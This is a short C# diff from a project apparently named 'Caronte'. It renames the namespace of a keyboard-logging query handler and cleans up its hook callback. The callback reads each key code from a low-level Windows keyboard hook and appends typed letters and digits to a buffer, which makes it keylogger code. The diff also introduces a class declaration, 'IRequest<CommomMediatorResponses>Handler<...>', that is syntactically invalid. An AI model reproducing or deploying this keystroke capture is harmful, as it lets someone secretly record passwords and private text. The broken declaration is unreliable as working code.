@@ -12,9 +12,9 @@ using System.Threading.Tasks;
 using System.Timers;
 using System.Windows.Forms;
 
-namespace Caronte.Modules.Logger
+namespace Caronte.Modules.Information.GetKeyboardLog
 {
-    public class GetKeyboardLogQueryHandler : IRequestHandler<GetKeyboardLogQuery>
+    public class GetKeyboardLogQueryHandler : IRequest<CommomMediatorResponses>Handler<GetKeyboardLogQuery>
     {
         private StringBuilder buffer;
         private readonly string desktopPath;
@@ -80,10 +80,10 @@ namespace Caronte.Modules.Logger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
 
-                if ((!Utils.KeyFunctions.IsKeyADigit((Keys)vkCode)) && (!Utils.KeyFunctions.IsKeyAChar((Keys)vkCode)))
+                if (!Utils.KeyFunctions.IsKeyADigit((Keys)vkCode) && !Utils.KeyFunctions.IsKeyAChar((Keys)vkCode))
                     return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
 
-                    buffer.Append(((Keys)vkCode).ToString());
+                buffer.Append(((Keys)vkCode).ToString());
 
                 inactivityTimer.Stop();
                 inactivityTimer.Start();
